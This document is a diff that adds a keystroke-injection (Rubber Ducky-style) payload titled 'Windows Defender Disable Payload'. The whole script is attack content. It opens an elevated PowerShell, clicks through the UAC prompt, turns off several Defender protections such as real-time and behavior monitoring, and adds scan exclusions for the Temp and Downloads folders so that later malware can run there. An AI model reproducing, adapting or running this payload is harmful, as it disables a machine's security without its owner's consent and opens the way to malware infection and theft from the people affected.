@@ -1,0 +1,51 @@
+REM ========================================
+REM Windows Defender Disable Payload
+REM Attempts to disable Windows security
+REM ========================================
+
+DELAY 2000
+
+REM Open PowerShell as Admin
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+
+REM Accept UAC
+ALT y
+DELAY 1500
+
+REM Disable Real-time Protection
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+
+REM Disable other protections
+STRING Set-MpPreference -DisableBehaviorMonitoring $true
+ENTER
+DELAY 200
+STRING Set-MpPreference -DisableBlockAtFirstSeen $true
+ENTER
+DELAY 200
+STRING Set-MpPreference -DisableIOAVProtection $true
+ENTER
+DELAY 200
+STRING Set-MpPreference -DisablePrivacyMode $true
+ENTER
+DELAY 200
+
+REM Add exclusion for temp folder
+STRING Add-MpPreference -ExclusionPath "$env:TEMP"
+ENTER
+DELAY 200
+STRING Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
+ENTER
+DELAY 500
+
+REM Confirm and exit
+STRING Write-Host "Defender disabled" -ForegroundColor Green
+ENTER
+DELAY 1000
+STRING exit
+ENTER
